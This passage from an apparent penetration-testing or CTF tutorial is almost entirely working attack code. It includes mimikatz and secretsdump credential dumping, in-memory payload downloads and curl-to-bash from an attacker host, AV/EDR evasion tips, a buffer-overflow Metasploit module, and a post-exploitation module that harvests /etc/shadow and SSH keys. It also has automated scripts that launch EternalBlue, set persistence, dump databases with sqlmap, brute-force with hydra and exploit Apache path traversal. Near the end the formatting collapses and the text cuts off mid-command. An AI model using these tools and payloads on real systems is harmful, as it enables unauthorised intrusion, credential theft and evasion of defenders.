impacket-psexec $DOMAIN/$USERNAME:$PASSWORD@$TARGET "copy \\\\10.10.14.5\\share\\mimikatz.exe C:\\Temp\\m.exe && C:\\Temp\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > C:\\Temp\\mimikatz.txt"

# 6. Parse and analyze results
echo "[+] Parsing credentials..."
grep -i "ntlm" credentials.ntds | cut -d: -f4 | sort -u > ntlm_hashes.txt
echo "[+] Found $(wc -l < ntlm_hashes.txt) unique NTLM hashes"

echo "[*] Post-exploitation complete!"
echo "[*] Results saved to current directory"
```

**Credential Storage and Management:**

```bash
# Organize dumped credentials
mkdir -p loot/{hashes,tickets,dumps,screenshots}

# Store secretsdump output
impacket-secretsdump domain/user:pass@target -outputfile loot/dumps/target_$(date +%Y%m%d)

# Extract and categorize hashes
grep ":::" loot/dumps/*.ntds | cut -d: -f4 > loot/hashes/ntlm_$(date +%Y%m%d).txt
grep "aes256" loot/dumps/*.ntds > loot/hashes/aes_$(date +%Y%m%d).txt

# Create hash database
cat > hash_db.py << 'EOF'
#!/usr/bin/env python3
import json
from datetime import datetime

class HashDB:
    def __init__(self, dbfile='hashes.json'):
        self.dbfile = dbfile
        self.load()
    
    def load(self):
        try:
            with open(self.dbfile, 'r') as f:
                self.db = json.load(f)
        except FileNotFoundError:
            self.db = {'users': {}}
    
    def save(self):
        with open(self.dbfile, 'w') as f:
            json.dump(self.db, f, indent=2)
    
    def add_hash(self, username, ntlm_hash, source, cracked=None):
        if username not in self.db['users']:
            self.db['users'][username] = {
                'hashes': [],
                'cracked': []
            }
        
        hash_entry = {
            'ntlm': ntlm_hash,
            'source': source,
            'date': datetime.now().isoformat(),
            'cracked': cracked
        }
        
        self.db['users'][username]['hashes'].append(hash_entry)
        if cracked:
            self.db['users'][username]['cracked'].append(cracked)
        
        self.save()
        print(f"[+] Added hash for {username}")

# Usage
db = HashDB()
db.add_hash('administrator', 'a87f3a337d73085c45f9416be5787d86', 'target1')
db.add_hash('sqlsvc', 'b87a3b447e84196d56g0527cf6898e97', 'target2', 'Password123!')
EOF

python3 hash_db.py
```

**Detection Evasion Best Practices:**

```bash
# Impacket evasion techniques

# 1. Use different execution methods
impacket-dcomexec domain/user:pass@target  # Instead of psexec
impacket-atexec domain/user:pass@target "cmd"  # Task scheduler

# 2. Avoid touching disk with smbexec
impacket-smbexec domain/user:pass@target  # No service executable

# 3. Randomize service names
impacket-psexec -service-name "WindowsUpdate$(date +%s)" domain/user:pass@target

# 4. Time-based execution (avoid peak hours)
impacket-atexec domain/user:pass@target "cmd /c powershell -c Start-Sleep 300; IEX(...)..."

# 5. Use Kerberos instead of NTLM
impacket-getTGT domain/user:pass
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain/user@target.domain.local

# Mimikatz evasion

# 1. Use in-memory execution
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# 2. Dump LSASS to analyze offline
# Create dump on target:
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\lsass.dmp full
# Analyze on Kali:
pypykatz lsa minidump lsass.dmp

# 3. Use alternative tools
# SharpKatz (C#)
# SafetyKatz (process dumping)
# Pypykatz (Python)

# PEAS evasion

# 1. Rename scripts
mv linpeas.sh update.sh
mv winPEAS.exe svchost.exe

# 2. Encode/compress
gzip linpeas.sh
base64 -w0 linpeas.sh > encoded.txt

# 3. Run from memory
curl http://10.10.14.5/linpeas.sh | bash
```

**Summary Comparison Table:**

|Tool|Platform|Primary Use|Requires Admin|Detection Risk|
|---|---|---|---|---|
|LinPEAS|Linux|PrivEsc enumeration|No|Low|
|WinPEAS|Windows|PrivEsc enumeration|No|Medium|
|Mimikatz|Windows|Credential extraction|Yes|High|
|Impacket (psexec)|Windows (remote)|Command execution|Yes|Medium-High|
|Impacket (secretsdump)|Windows (remote)|Credential dumping|Yes|Medium|
|Impacket (wmiexec)|Windows (remote)|Command execution|Yes|Medium|

**Quick Reference Commands:**

```bash
# LinPEAS - Fast enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# WinPEAS - Fast enumeration  
certutil -urlcache -f http://10.10.14.5/winPEAS.exe wp.exe && wp.exe

# Mimikatz - Quick credential dump
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Impacket - Quick access check
impacket-psexec domain/user:pass@target whoami

# Impacket - Quick credential dump
impacket-secretsdump domain/user:pass@target

# Impacket - Kerberoast
impacket-GetUserSPNs domain/user:pass -request -outputfile kerberoast.txt
```

---

**Related Critical Topics:**

- **Active Directory enumeration and attack techniques** - comprehensive AD exploitation methodology
- **Credential cracking and password attacks** - hashcat, john, rainbow tables
- **Anti-virus and EDR evasion** - bypassing modern security solutions chains, and shellcode writing
- **Payload Encoding and Obfuscation** - AV/EDR evasion techniques
- **Post-Exploitation Frameworks** - Empire, Covenant, Sliver for persistent access

---

#### Advanced Metasploit Techniques

**Custom Module Development:**

```ruby
##
# Custom Metasploit Exploit Module Template
# Save to: ~/.msf4/modules/exploits/custom/myexploit.rb
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Application Remote Code Execution',
      'Description'    => %q{
        This module exploits a buffer overflow vulnerability in Custom Application 1.0.
        The vulnerability occurs when processing user input without proper bounds checking.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2024-12345'],
          ['URL', 'https://example.com/advisory']
        ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['Linux x86', { 'Ret' => 0x08048484 }]
        ],
      'Payload'        =>
        {
          'Space'    => 500,
          'BadChars' => "\x00\x0a\x0d",
        },
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(9999)
      ])
  end

  def exploit
    connect

    # Receive banner
    banner = sock.get_once
    print_status("Banner: #{banner}")

    # Build exploit buffer
    buffer = "A" * 2003
    buffer += [target.ret].pack('V')  # Overwrite EIP
    buffer += make_nops(16)           # NOP sled
    buffer += payload.encoded         # Shellcode
    buffer += "C" * (3000 - buffer.length)

    print_status("Sending exploit buffer (#{buffer.length} bytes)...")
    sock.put(buffer)

    handler
    disconnect
  end
end
```

**Loading and Using Custom Modules:**

```bash
# Reload modules after adding custom module
msf6> reload_all

# Search for custom module
msf6> search custom

# Use custom module
msf6> use exploit/custom/myexploit
msf6 exploit(custom/myexploit)> show options
msf6 exploit(custom/myexploit)> set RHOSTS 192.168.1.10
msf6 exploit(custom/myexploit)> set PAYLOAD linux/x86/shell_reverse_tcp
msf6 exploit(custom/myexploit)> set LHOST 10.10.14.5
msf6 exploit(custom/myexploit)> exploit
```

**Custom Post-Exploitation Module:**

```ruby
##
# Custom Post-Exploitation Module
# Save to: ~/.msf4/modules/post/custom/credential_harvester.rb
##

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Custom Credential Harvester',
      'Description'   => %q{
        This module searches for credentials in common locations
        and configuration files on compromised Linux systems.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Your Name'],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['meterpreter', 'shell']
    ))
  end

  def run
    print_status("Starting credential harvesting...")

    # Check common credential locations
    credential_files = [
      '/home/*/.ssh/id_rsa',
      '/home/*/.ssh/id_dsa',
      '/home/*/.bash_history',
      '/home/*/.mysql_history',
      '/root/.ssh/id_rsa',
      '/etc/shadow',
      '/var/www/html/config.php',
      '/var/www/html/wp-config.php'
    ]

    credential_files.each do |file_pattern|
      begin
        cmd_exec("find / -path '#{file_pattern}' 2>/dev/null").each_line do |file|
          file = file.chomp
          
          if file_exists?(file)
            print_good("Found: #{file}")
            
            content = read_file(file)
            
            # Store in loot
            store_loot(
              "credential.file",
              "text/plain",
              session,
              content,
              File.basename(file),
              "Credential file: #{file}"
            )
          end
        end
      rescue => e
        print_error("Error processing #{file_pattern}: #{e.message}")
      end
    end

    # Extract SSH keys
    print_status("Extracting SSH keys...")
    ssh_keys = cmd_exec("grep -r 'BEGIN.*PRIVATE KEY' /home /root 2>/dev/null")
    
    if ssh_keys.length > 0
      print_good("SSH keys found!")
      store_loot("ssh.keys", "text/plain", session, ssh_keys, "ssh_keys.txt", "SSH Private Keys")
    end

    print_status("Credential harvesting complete")
  end
end
```

**Running Custom Post-Exploitation:**

```bash
# After obtaining session
meterpreter> background

msf6> use post/custom/credential_harvester
msf6 post(custom/credential_harvester)> set SESSION 1
msf6 post(custom/credential_harvester)> run

# View collected loot
msf6> loot
```

**Metasploit Auxiliary Scanner Module:**

```ruby
##
# Custom Scanner Module
# Save to: ~/.msf4/modules/auxiliary/scanner/custom/service_detector.rb
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Service Version Detector',
      'Description'    => %q{
        This module detects custom service versions by analyzing banners
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(9999),
        OptInt.new('TIMEOUT', [true, 'Connection timeout', 10])
      ])
  end

  def run_host(ip)
    begin
      connect(false, {'RPORT' => rport})
      
      banner = sock.get_once(-1, datastore['TIMEOUT'])
      
      if banner
        print_good("#{ip}:#{rport} - Banner: #{banner.strip}")
        
        # Parse version
        if banner =~ /CustomApp\/([0-9\.]+)/
          version = $1
          print_status("#{ip}:#{rport} - Version detected: #{version}")
          
          # Report to database
          report_service(
            host: ip,
            port: rport,
            name: 'customapp',
            proto: 'tcp',
            info: "CustomApp #{version}"
          )
        end
      else
        print_error("#{ip}:#{rport} - No banner received")
      end
      
      disconnect
      
    rescue ::Rex::ConnectionRefused
      print_error("#{ip}:#{rport} - Connection refused")
    rescue ::Rex::ConnectionTimeout
      print_error("#{ip}:#{rport} - Connection timeout")
    rescue => e
      print_error("#{ip}:#{rport} - Error: #{e.class} #{e}")
    end
  end
end
```

**Resource Script Automation:**

```bash
# Create comprehensive resource script
cat > comprehensive_exploit.rc << 'EOF'
# Comprehensive Exploitation Resource Script

# Set global options
setg LHOST 10.10.14.5
setg LPORT 4444
setg ExitOnSession false
setg Verbose true

# Create workspace
workspace -a comprehensive_target
db_nmap -sV -sC -p- 192.168.1.10

# Attempt multiple exploits based on discovered services
# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
run -j

sleep 5

# Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.10
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
run -j

sleep 5

# vsftpd backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.10
run -j

sleep 5

# Apache Struts
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 192.168.1.10
set RPORT 80
set TARGETURI /struts2-showcase
run -j

# Wait for sessions
sleep 10

# Check active sessions
sessions -l

# Post-exploitation on all sessions
sessions -C "sysinfo"
sessions -C "getuid"

# Run local exploit suggester on all sessions
sessions -i 1 -C "use post/multi/recon/local_exploit_suggester; set SESSION 1; run"

# Dump credentials
sessions -i 1 -C "load kiwi; creds_all"

# Establish persistence
sessions -i 1 -C "run persistence -X -i 60 -p 4445 -r 10.10.14.5"
EOF

# Execute resource script
msfconsole -r comprehensive_exploit.rc
```

---

#### Advanced Searchsploit Integration

**Automated Exploit Testing Pipeline:**

```bash
#!/bin/bash
# Automated Exploit Testing from Searchsploit Results

TARGET=$1
NMAP_RESULTS=$2
EXPLOIT_DIR="exploits_$(date +%Y%m%d_%H%M%S)"

mkdir -p $EXPLOIT_DIR/{downloaded,modified,results}

echo "[*] Automated Exploit Testing Pipeline"
echo "[*] Target: $TARGET"

# Extract services from nmap
grep -E "open.*tcp" $NMAP_RESULTS | while read line; do
    port=$(echo $line | awk '{print $1}' | cut -d'/' -f1)
    service=$(echo $line | awk '{print $3}')
    version=$(echo $line | awk '{for(i=4;i<=NF;i++) printf $i" "}')
    
    echo ""
    echo "=== Processing: $service $version on port $port ==="
    
    # Search for exploits
    searchsploit "$service $version" --json > $EXPLOIT_DIR/search_${service}_${port}.json
    
    # Extract exploit paths
    jq -r '.RESULTS_EXPLOIT[] | select(.Type | contains("remote")) | .Path' \
        $EXPLOIT_DIR/search_${service}_${port}.json > $EXPLOIT_DIR/exploits_${service}_${port}.txt
    
    # Download and test each exploit
    while read exploit_path; do
        exploit_id=$(basename $exploit_path | cut -d'.' -f1)
        exploit_ext=$(basename $exploit_path | cut -d'.' -f2)
        
        echo "[*] Testing exploit: $exploit_path"
        
        # Copy exploit
        searchsploit -m $exploit_path -p $EXPLOIT_DIR/downloaded/
        
        exploit_file="$EXPLOIT_DIR/downloaded/$(basename $exploit_path)"
        
        # Attempt to modify exploit automatically
        case $exploit_ext in
            py|python)
                echo "[*] Python exploit detected"
                
                # Replace common placeholders
                sed -i "s/TARGET_IP/$TARGET/g" $exploit_file
                sed -i "s/TARGET_HOST/$TARGET/g" $exploit_file
                sed -i "s/RHOST = .*/RHOST = \"$TARGET\"/g" $exploit_file
                sed -i "s/LHOST = .*/LHOST = \"10.10.14.5\"/g" $exploit_file
                sed -i "s/LPORT = .*/LPORT = 4444/g" $exploit_file
                
                # Try to execute
                timeout 30 python3 $exploit_file > $EXPLOIT_DIR/results/${exploit_id}_output.txt 2>&1
                
                if [ $? -eq 0 ]; then
                    echo "[+] Exploit may have succeeded: $exploit_id"
                else
                    echo "[-] Exploit failed or timed out: $exploit_id"
                fi
                ;;
                
            rb|ruby)
                echo "[*] Ruby exploit detected"
                
                sed -i "s/TARGET_IP/$TARGET/g" $exploit_file
                timeout 30 ruby $exploit_file > $EXPLOIT_DIR/results/${exploit_id}_output.txt 2>&1
                ;;
                
            sh|bash)
                echo "[*] Bash exploit detected"
                
                sed -i "s/TARGET_IP/$TARGET/g" $exploit_file
                chmod +x $exploit_file
                timeout 30 $exploit_file > $EXPLOIT_DIR/results/${exploit_id}_output.txt 2>&1
                ;;
                
            c)
                echo "[*] C exploit detected - compilation required"
                
                # Attempt compilation
                gcc $exploit_file -o $EXPLOIT_DIR/downloaded/${exploit_id} 2>&1
                
                if [ $? -eq 0 ]; then
                    echo "[+] Compilation successful"
                    # Manual execution required
                    echo "[!] Manual execution required: $EXPLOIT_DIR/downloaded/${exploit_id}"
                else
                    echo "[-] Compilation failed"
                fi
                ;;
                
            *)
                echo "[*] Unknown exploit type: $exploit_ext"
                echo "[!] Manual review required: $exploit_file"
                ;;
        esac
        
    done < $EXPLOIT_DIR/exploits_${service}_${port}.txt
    
done

echo ""
echo "[*] Automated testing complete"
echo "[*] Review results in: $EXPLOIT_DIR/results/"
echo "[*] Check for successful exploitation indicators"

# Summarize results
echo ""
echo "=== Results Summary ==="
for result_file in $EXPLOIT_DIR/results/*_output.txt; do
    if grep -qiE "shell|session|exploit.*success|uid=|root" $result_file; then
        echo "[+] Potential success: $(basename $result_file)"
        echo "    Preview:"
        head -5 $result_file | sed 's/^/    /'
    fi
done
```

**Exploit Metadata Extraction:**

```bash
#!/bin/bash
# Extract useful metadata from exploits

EXPLOIT_FILE=$1

if [ ! -f "$EXPLOIT_FILE" ]; then
    echo "Usage: $0 <exploit_file>"
    exit 1
fi

echo "=== Exploit Analysis: $EXPLOIT_FILE ==="
echo ""

# Extract CVE references
echo "[*] CVE References:"
grep -oP 'CVE-\d{4}-\d{4,}' $EXPLOIT_FILE | sort -u

echo ""
echo "[*] Required Dependencies:"
grep -iE "import|require|include" $EXPLOIT_FILE | head -10

echo ""
echo "[*] Configuration Variables:"
grep -E "TARGET|HOST|PORT|LHOST|LPORT|RHOST|RPORT" $EXPLOIT_FILE | grep -v "^#" | head -10

echo ""
echo "[*] Exploit Type:"
if grep -qi "buffer overflow" $EXPLOIT_FILE; then
    echo "  - Buffer Overflow"
fi
if grep -qi "sql injection" $EXPLOIT_FILE; then
    echo "  - SQL Injection"
fi
if grep -qi "command injection" $EXPLOIT_FILE; then
    echo "  - Command Injection"
fi
if grep -qi "path traversal" $EXPLOIT_FILE; then
    echo "  - Path Traversal"
fi

echo ""
echo "[*] Platform:"
if grep -qE "windows|win32" $EXPLOIT_FILE; then
    echo "  - Windows"
fi
if grep -qE "linux|unix" $EXPLOIT_FILE; then
    echo "  - Linux/Unix"
fi

echo ""
echo "[*] Payload Type:"
grep -iE "reverse.*shell|bind.*shell|meterpreter" $EXPLOIT_FILE | head -5

echo ""
echo "[*] Usage Instructions:"
grep -A5 -iE "usage|example|how to" $EXPLOIT_FILE | head -20
```

---

#### Advanced Custom Script Development

**Exploit Development Framework:**

```python
#!/usr/bin/env python3
"""
Universal Exploit Development Framework
Provides common functions for exploit development
"""

import socket
import struct
import sys
import time
import subprocess
from pwn import *  # pwntools library

class ExploitFramework:
    """Base class for exploit development"""
    
    def __init__(self, target_ip, target_port, lhost, lport):
        self.target_ip = target_ip
        self.target_port = target_port
        self.lhost = lhost
        self.lport = lport
        self.sock = None
        
    def connect(self):
        """Establish connection to target"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.target_ip, self.target_port))
            log.success(f"Connected to {self.target_ip}:{self.target_port}")
            return True
        except Exception as e:
            log.error(f"Connection failed: {e}")
            return False
    
    def receive(self, size=4096):
        """Receive data from target"""
        try:
            data = self.sock.recv(size)
            log.info(f"Received {len(data)} bytes")
            return data
        except Exception as e:
            log.error(f"Receive failed: {e}")
            return None
    
    def send(self, data):
        """Send data to target"""
        try:
            self.sock.send(data)
            log.info(f"Sent {len(data)} bytes")
            return True
        except Exception as e:
            log.error(f"Send failed: {e}")
            return False
    
    def close(self):
        """Close connection"""
        if self.sock:
            self.sock.close()
            log.info("Connection closed")
    
    def generate_pattern(self, length):
        """Generate cyclic pattern for offset finding"""
        return cyclic(length)
    
    def find_offset(self, pattern, value):
        """Find offset in cyclic pattern"""
        return cyclic_find(value)
    
    def generate_shellcode(self, payload_type="shell_reverse_tcp"):
        """Generate shellcode using msfvenom"""
        cmd = [
            "msfvenom",
            "-p", f"linux/x64/{payload_type}",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", "python",
            "-b", "\\x00\\x0a\\x0d"
        ]
        
        log.info("Generating shellcode...")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            # Extract shellcode
            for line in result.stdout.split('\n'):
                if line.startswith('buf'):
                    shellcode = eval(line.replace('buf = ', ''))
                    log.success(f"Shellcode generated ({len(shellcode)} bytes)")
                    return shellcode
        
        log.error("Shellcode generation failed")
        return None
    
    def pack_address(self, address):
        """Pack address in little-endian format"""
        return struct.pack("<I", address)
    
    def pack_address_64(self, address):
        """Pack 64-bit address in little-endian format"""
        return struct.pack("<Q", address)
    
    def build_rop_chain(self, gadgets):
        """Build ROP chain from gadget list"""
        rop_chain = b""
        for gadget in gadgets:
            rop_chain += self.pack_address(gadget)
        return rop_chain
    
    def start_listener(self):
        """Start netcat listener for reverse shell"""
        log.info(f"Starting listener on {self.lhost}:{self.lport}")
        listener = listen(self.lport, bindaddr=self.lhost)
        return listener
    
    def interactive_shell(self, conn):
        """Drop to interactive shell"""
        log.success("Dropping to interactive shell...")
        conn.interactive()

# Example usage
class CustomExploit(ExploitFramework):
    """Custom exploit implementation"""
    
    def exploit(self):
        """Main exploitation logic"""
        log.info("Starting exploitation...")
        
        # Connect to target
        if not self.connect():
            return False
        
        # Receive banner
        banner = self.receive()
        log.info(f"Banner: {banner.decode('utf-8', errors='ignore')}")
        
        # Build exploit
        offset = 2003
        shellcode = self.generate_shellcode()
        
        if not shellcode:
            return False
        
        # ROP gadgets (example addresses)
        jmp_esp = 0x625011af
        
        payload = b"A" * offset
        payload += self.pack_address(jmp_esp)
        payload += b"\x90" * 16  # NOP sled
        payload += shellcode
        payload += b"C" * (3000 - len(payload))
        
        # Send exploit
        log.info(f"Sending payload ({len(payload)} bytes)...")
        self.send(payload)
        
        self.close()
        
        # Catch shell
        log.info("Waiting for shell...")
        time.sleep(2)
        
        try:
            shell = remote(self.lhost, self.lport, timeout=10)
            log.success("Shell received!")
            self.interactive_shell(shell)
            return True
        except:
            log.error("No shell received")
            return False

if __name__ == "__main__":
    # Configuration
    TARGET_IP = "192.168.1.10"
    TARGET_PORT = 9999
    LHOST = "10.10.14.5"
    LPORT = 4444
    
    # Create exploit instance
    exploit = CustomExploit(TARGET_IP, TARGET_PORT, LHOST, LPORT)
    
    # Run exploitation
    exploit.exploit()
```

**Fuzzing Script for Vulnerability Discovery:**

```python
#!/usr/bin/env python3
"""
Network Protocol Fuzzer
Discovers buffer overflow vulnerabilities
"""

import socket
import sys
import time

TARGET_IP = "192.168.1.10"
TARGET_PORT = 9999

def send_payload(payload):
    """Send payload to target and check for crash"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET_IP, TARGET_PORT))
        
        # Receive banner
        banner = sock.recv(1024)
        
        # Send payload
        sock.send(payload)
        
        # Try to receive response
        try:
            response = sock.recv(1024)
            sock.close()
            return True, len(response)
        except:
            # Connection died - potential crash
            sock.close()
            return False, 0
            
    except Exception as e:
        return False, 0

def fuzz_command(command, min_size=100, max_size=5000, step=100):
    """Fuzz specific command with increasing payload sizes"""
    print(f"[*] Fuzzing command: {command}")
    
    crash_size = None
    
    for size in range(min_size, max_size, step):
        payload = command.encode() + b" " + b"A" * size + b"\n"
        
        print(f"[*] Sending {size} bytes...", end=" ")
        
        success, response_len = send_payload(payload)
        
        if success:
            print(f"OK (response: {response_len} bytes)")
        else:
            print(f"CRASH DETECTED!")
            crash_size = size
            break
        
        time.sleep(0.5)
    
    if crash_size:
        print(f"[+] Crash occurred at approximately {crash_size} bytes")
        
        # Fine-tune crash size
        print("[*] Fine-tuning crash size...")
        for size in range(crash_size - step, crash_size + step, 10):
            payload = command.encode() + b" " + b"A" * size + b"\n"
            success, _ = send_payload(payload)
            
            if not success:
                print(f"[+] Precise crash size: {size} bytes")
                return size
    
    return None

def find_offset(crash_size):
    """Generate pattern to find exact EIP offset"""
    print("[*] Generating cyclic pattern to find offset...")
    
    # Generate pattern using pwntools or manually
    from pwn import cyclic, cyclic_find
    
    pattern = cyclic(crash_size + 100)
    
    # Send pattern
    payload = b"COMMAND " + pattern + b"\n"
    send_payload(payload)
    
    print("[*] Pattern sent")
    print("[!] Attach debugger and check EIP value")
    print("[!] Use: cyclic_find(<EIP_value>) to find offset")

if __name__ == "__main__":
    print("[*] Network Protocol Fuzzer")
    print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
    
    # Define commands to fuzz
    commands = ["USER", "PASS", "LIST", "GET", "PUT", "STATS"]
    
    for cmd in commands:
        crash_size = fuzz_command(cmd)
        
        if crash_size:
            print(f"\n[+] Vulnerability found in {cmd} command!")
            find_offset(crash_size)
            break
        
        print()
```

**Exploit Reliability Tester:**

```bash
#!/bin/bash
# Test exploit reliability across multiple attempts

EXPLOIT_SCRIPT=$1
TARGET=$2
ATTEMPTS=${3:-10}

if [ -z "$EXPLOIT_SCRIPT" ] || [ -z "$TARGET" ]; then
    echo "Usage: $0 <exploit_script> <target> [attempts]"
    exit 1
fi

echo "[*] Exploit Reliability Tester"
echo "[*] Exploit: $EXPLOIT_SCRIPT"
echo "[*] Target: $TARGET"
echo "[*] Attempts: $ATTEMPTS"

success_count=0
failure_count=0

for i in $(seq 1 $ATTEMPTS); do
    echo ""
    echo "=== Attempt $i/$ATTEMPTS ==="
    
    # Start listener
    nc -lvnp 4444 > /tmp/shell_output_$i.txt 2>&1 &
    listener_pid=$!
    
    sleep 2
    
    # Run exploit
    timeout 30 python3 $EXPLOIT_SCRIPT $TARGET
    exploit_exit=$?
    
    sleep 5
    
    # Check if shell was received
    if ps -p $listener_pid > /dev/null; then
        # Listener still running - check if connection made
        if grep -q "connect to" /tmp/shell_output_$i.txt; then
            echo "[+] SUCCESS: Shell received"
            ((success_count++))
            
            # Send command to verify
            echo "id" | nc localhost 4444
        else
            echo "[-] FAILURE: No connection"
            ((failure_count++))
        fi
        
        kill $listener_pid 2>/dev/null
    else
        echo "[-] FAILURE: No shell"
        ((failure_count++))
    fi
    
    # Wait before next attempt
    sleep 3
done

echo ""
echo "=== Results Summary ==="
echo "Total attempts: $ATTEMPTS"
echo "Successful: $success_count"
echo "Failed: $failure_count"
echo "Success rate: $(echo "scale=2; $success_count * 100 / $ATTEMPTS" | bc)%"

if [ $success_count -gt $(echo "$ATTEMPTS * 0.8" | bc | cut -d'.' -f1) ]; then
    echo "[+] Exploit is RELIABLE (>80% success rate)"
elif [ $success_count -gt $(echo "$ATTEMPTS * 0.5" | bc | cut -d'.' -f1) ]; then
    echo "[~] Exploit is MODERATE (50-80% success rate)"
else
    echo "[-] Exploit is UNRELIABLE (<50% success rate)"
fi
```

---

#### Tool Integration and Automation

**Complete Exploitation Pipeline:**

```bash
#!/bin/bash
# Complete automated exploitation pipeline
# Integrates: Nmap → Searchsploit → Metasploit → Custom Scripts

TARGET=$1
WORKSPACE="ctf_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

mkdir -p $WORKSPACE/{recon,exploits,loot}
cd $WORKSPACE

echo "========================================="
echo " AUTOMATED EXPLOITATION PIPELINE"
echo "========================================="
echo "Target: $TARGET"
echo "Workspace: $WORKSPACE"
echo "========================================="

# Phase 1: Reconnaissance
echo ""
echo "[Phase 1] Reconnaissance"
echo "-------------------------"

nmap -sV -sC -p- -oA recon/full_scan $TARGET &
nmap_pid=$!

nmap -sV --top-ports 1000 -oN recon/quick_scan.txt $TARGET
echo "[+] Quick scan complete"

wait $nmap_pid
echo "[+] Full scan complete"

# Phase 2: Exploit Research
echo ""
echo "[Phase 2] Exploit Research"
echo "-------------------------"

grep -E "open.*tcp" recon/quick_scan.txt | while read line; do
    service=$(echo $line | awk '{print $3,$4,$5}')
    echo "[*] Researching: $service"
    searchsploit "$service" >> exploits/searchsploit_results.txt
done

# Count potential exploits
exploit_count=$(grep -c "Exploit Title" exploits/searchsploit_results.txt)
echo "[+] Found $exploit_count potential exploits"

# Phase 3: Metasploit Automation
echo ""
echo "[Phase 3] Metasploit Automation"
echo "--------------------------------"

cat > exploits/msf_auto.rc << EOF
workspace -a $WORKSPACE
db_import ../recon/full_scan.xml

# Automated exploitation attempts
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Try common exploits
EOF

# Add exploit attempts based on discovered services
if grep -q "vsftpd 2.3.4" recon/quick_scan.txt; then
    cat >> exploits/msf_auto.rc << EOF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $TARGET
exploit -j
EOF
fi

if grep -q "445/tcp.*Microsoft" recon/quick_scan.txt; then cat >> exploits/msf_auto.rc << EOF use exploit/windows/smb/ms17_010_eternalblue set RHOSTS $TARGET set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.10.14.5 set LPORT 4445 check exploit -j EOF fi

if grep -qE "80/tcp|443/tcp" recon/quick_scan.txt; then cat >> exploits/msf_auto.rc << EOF use auxiliary/scanner/http/dir_scanner set RHOSTS $TARGET run

use exploit/multi/http/apache_normalize_path_rce set RHOSTS $TARGET check exploit -j EOF fi

echo "[*] Running Metasploit automation..." msfconsole -q -r exploits/msf_auto.rc | tee exploits/msf_output.txt & msf_pid=$!

# Phase 4: Custom Script Execution

echo "" echo "[Phase 4] Custom Script Execution" echo "----------------------------------"

# SQL Injection testing

if grep -qE "80/tcp|443/tcp" recon/quick_scan.txt; then echo "[*] Testing for SQL injection..."

# Try to find web forms
curl -s http://$TARGET | grep -oP 'action="[^"]+' | cut -d'"' -f2 | while read endpoint; do
    echo "[*] Testing endpoint: $endpoint"
    sqlmap -u "http://$TARGET$endpoint?id=1" --batch --risk 2 --level 2 \
        --dump-all --output-dir=exploits/sqlmap/ > exploits/sqlmap_${endpoint//\//_}.txt 2>&1 &
done
fi

# Default credential testing

echo "[*] Testing default credentials..."

if grep -q "22/tcp.*ssh" recon/quick_scan.txt; then hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt  
ssh://$TARGET -t 4 -V | tee exploits/ssh_defaults.txt & fi

if grep -q "3306/tcp.*mysql" recon/quick_scan.txt; then hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt  
mysql://$TARGET -t 4 | tee exploits/mysql_defaults.txt & fi

# Phase 5: Vulnerability-Specific Exploits

echo "" echo "[Phase 5] Vulnerability-Specific Exploitation" echo "----------------------------------------------"

# Check for specific vulnerable versions

if grep -q "Apache.*2.4.49|Apache.*2.4.50" recon/quick_scan.txt; then echo "[+] Apache 2.4.49/50 Path Traversal detected!"

cat > exploits/apache_2449_exploit.sh << 'EXPLOIT_EOF'

#!/bin/bash TARGET=$1 echo "[_] Exploiting Apache 2.4.49/50 Path Traversal" echo "[_] Reading /etc/passwd..." curl -s --path-as-is "http://$TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" echo "" echo "[*] Attempting RCE..." curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id"  
